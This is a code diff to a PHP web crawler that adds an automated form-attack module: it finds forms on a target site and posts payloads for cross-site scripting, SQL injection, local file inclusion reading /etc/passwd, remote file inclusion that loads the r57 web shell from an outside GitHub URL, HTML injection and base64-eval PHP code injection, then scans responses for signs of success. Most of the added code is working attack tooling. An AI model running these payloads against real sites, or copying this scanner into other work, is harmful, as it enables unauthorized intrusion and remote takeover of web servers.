@@ -15,8 +15,10 @@
         - Find Internal Urls
         - Find External Urls
         - Find pages which header may reflect into content
-        - Find pages which is form containing
         - Find pages which may possible for SQL Injection attacks.
+        - Find pages which is form containing
+        - Find form elements which may execute malicious codes
+            > Pentest form elements by sending post datas to action page (XSS,RFI,LFI,SQL,HTML Injection,Php Code Injection)
         - Save all results to html page(s) in list sort  ( internal.html , external.html )
 */
 
@@ -92,7 +94,7 @@ print $prefix.'Miyachung greets you :)';
 
 // ----- Functions below
 
-function spider( $link ){
+function spider( $link , $post = false){
 
     $curl = curl_init();
     curl_setopt_array($curl,[CURLOPT_TIMEOUT => 15,
@@ -106,6 +108,10 @@ function spider( $link ){
     CURLOPT_SSL_VERIFYPEER => 0,
     CURLOPT_SSL_VERIFYHOST => 0,
     ]);
+    if($post != false){
+        curl_setopt($curl,CURLOPT_POST,1);
+        curl_setopt($curl,CURLOPT_POSTFIELDS,$post);
+    }
     $content = curl_exec($curl);
     $info    = curl_getinfo($curl);
     curl_close($curl);
@@ -119,7 +125,6 @@ function spider( $link ){
         return [$content,$header];
     }
 }
-
 function header_reflect_check ( $content ){
 
     $reflected = [];
@@ -178,7 +183,7 @@ function internal_search( $links , $target_http ,$target ){
     $new_internal    = [];
     $new_external    = [];
     $scanned_links   = [];
-
+    $posted_forms    = [];
     foreach($links[0] as $internal_link){
 
         $total_link      = $target_http.$internal_link;
@@ -207,6 +212,13 @@ function internal_search( $links , $target_http ,$target ){
         if($check_form != false){
             $check_form_string = implode("\r\n",$check_form);
             write_to_file('internal.html','<ul><li><h4 style="margin:0;padding:0;">This page contains form</h4><br/><textarea style="width:50%;height:300px;overflow:auto">'.$check_form_string.'</textarea></li></ul>');
+           
+            foreach($check_form as $form){
+                if(!in_array($form,$posted_forms)){
+                    $posted_forms[] = $form;
+                    $postit = form_post_process($form,$total_link,$target_http);
+                }
+            }
         } 
         if(preg_match('@<title>(.*?)</title>@i',$spider_internal[0],$title)){
             print "\tTitle found => ".trim(strip_tags($title[1])).PHP_EOL;
@@ -275,6 +287,12 @@ function internal_search( $links , $target_http ,$target ){
             if($check_form != false){
                 $check_form_string = implode("\r\n",$check_form);
                 write_to_file('internal.html','<ul><li><h4 style="margin:0;padding:0;">This page contains form</h4><br/><textarea style="width:50%;height:300px;overflow:auto">'.$check_form_string.'</textarea></li></ul>');
+                foreach($check_form as $form){
+                    if(!in_array($form,$posted_forms)){
+                        $posted_forms[] = $form;
+                        $postit = form_post_process($form,$target_http.$link_choose,$target_http);
+                    }
+                }
             } 
             if(preg_match('@<title>(.*?)</title>@',$search_deep[0],$deep_title)){
                 print "\tTitle taken: ".trim(strip_tags($deep_title[1])).PHP_EOL;
@@ -308,6 +326,114 @@ function internal_search( $links , $target_http ,$target ){
         print "\tSpider has got nothing from section 2 :(".PHP_EOL;
     }
 
+}
+
+function form_post_process( $form_content , $total_link , $target_http ){
+    $form_post = [];
+    
+        $form_content = stripslashes($form_content);
+        preg_match_all('@name="(.*?)"@si',$form_content,$names);
+        preg_match('@action="(.*?)"@si',$form_content,$action);
+        if(empty($action[1])){
+            $toAct    = $total_link;
+        }elseif(!strstr($action[1],'http')){
+            $toAct    = $target_http.'/'.$action[1];
+        }else{
+            $toAct    = $action[1];
+        }
+        $form_post['action'][] = $toAct;
+
+        $pf = "";
+        foreach($names[1] as $name){
+           $pf .= $name."=VALUE&";
+        }
+        $pf = rtrim($pf,'&');
+
+        $form_post['postfields'][] = $pf;
+    
+ 
+    if(!empty($form_post)){
+        print "\tSpider has found form elements inside of the codes, sending postfields!".PHP_EOL;
+        foreach($form_post['action'] as $key => $action_url){
+
+            $field   = $form_post['postfields'][$key];
+
+            $prepare = prepare_field($field);
+            write_to_file('internal.html','<ul>');
+            foreach($prepare as $x => $pfield){
+                $post_page  = spider($action_url,$pfield);
+                print "\tPostfield ".($x+1)." has sent".PHP_EOL;
+                write_to_file('internal.html','<li><font color="red">[POST]</font> <a href="'.$action_url.'" target="_blank">'.$action_url.'</a></li><li><pre>'.$post_page[1].'</pre></li><ul><li><strong>[POST DATA]</strong> : <input type="text" style="width:100%;" value="'.htmlspecialchars(urldecode($pfield)).'" /></li></ul>');
+              
+                if(!empty($post_page[0])){
+                    $control    = post_penetration_control($post_page[0]);
+                    if($control != false){
+                        foreach($control as $result){
+                            write_to_file('internal.html','<ul><li><font color="red">'.$result.'</font></li><li><input type="text" style="width:100%" value="'.$pfield.'"></li></ul>');
+                        }
+                    }
+                }else{
+                    print "\tNo content in the page!".PHP_EOL;
+                }
+              
+            }
+            write_to_file('internal.html','</ul>');
+
+        }
+
+
+    }else{
+        return false;
+    }
+}
+function post_penetration_control($content){
+    $results = [];
+
+    if(strstr($content,'"><script>alert("spiderPenetrationXSS");</script>')){
+        $results[] = 'This post-data has affected to page content by malicious XSS attack';
+    }elseif(strstr($content,'SQL syntax') || strstr($content,'mysql_fetch_assoc(') || strstr($content,'mysql_num_rows(') || strstr($content,'mysql_fetch_array(')){
+        $results[] = 'This post-data has affected to page content by malicious SQL attack';
+    }elseif(strstr($content,'root:x:')){
+        $results[] = 'This post-data has affected to page content by malicious Local File Inclusion attack';
+    }elseif(strstr($content,'uname -a :')){
+        $results[] = 'This post-data has affected to page content by malicious Remote File Inclusion attack';
+    }elseif(strstr($content,'<h1>spiderPenetrationHTML</h1>')){
+        $results[] = 'This post-data has affected to page content by malicious HTML Injection attack'; 
+    }elseif(strstr($content,'<h1>spiderPenetrationHTML</h1>')){
+        $results[] = 'This post-data has affected to page content by malicious HTML Injection attack'; 
+    }elseif(strstr($content,'Loaded Configuration File') && strstr($content,'Zend Extension Build')){
+        $results[] = 'This post-data has affected to page content by malicious PHP Code Injection attack'; 
+    }
+
+    if(!empty($results)){
+        return $results;
+    }else{
+        return false;
+    }
+
+}
+function prepare_field($field){
+
+    // Prepared for XSS
+    $xss = str_replace('VALUE',urlencode('"><script>alert("spiderPenetrationXSS");</script>'),$field);
+    // Prepared for SQL
+    $sql = str_replace('VALUE',urlencode("1'spiderPenetrate"),$field);
+    // Prepared for Local File Inclusion
+    $lfi = str_replace('VALUE',urlencode('../../../../../../../../../../../etc/passwd%00'),$field);
+    // Prepared for Remote File Inclusion
+    $rfi = str_replace('VALUE',urlencode('https://raw.githubusercontent.com/seakBz/r57-shell/master/r57shell.php.txt?'),$field);
+    // Prepared for HTML Injection
+    $html = str_replace('VALUE',urlencode("<h1>spiderPenetrationHTML</h1>"),$field);
+    // Prepared for PHP Code Injection with tags (without eval)
+    $php1 = str_replace('VALUE',urlencode('<?php phpinfo(); ?>'),$field);
+    // Prepared for PHP Code Injection without tags (without eval)
+    $php2 = str_replace('VALUE',urlencode('phpinfo();'),$field);
+    // Prepared for PHP Code Injection with tags (with eval)
+    $php3 = str_replace('VALUE',urlencode('<?php eval(base64_decode("cGhwaW5mbygpOw==")); ?>'),$field);
+     // Prepared for PHP Code Injection without tags (with eval)
+    $php4 = str_replace('VALUE',urlencode('eval(base64_decode("cGhwaW5mbygpOw=="));'),$field);
+
+    return [$xss,$sql,$lfi,$rfi,$html,$php1,$php2,$php3,$php4];
 }
 
 function seperate_links( $content , $control ){
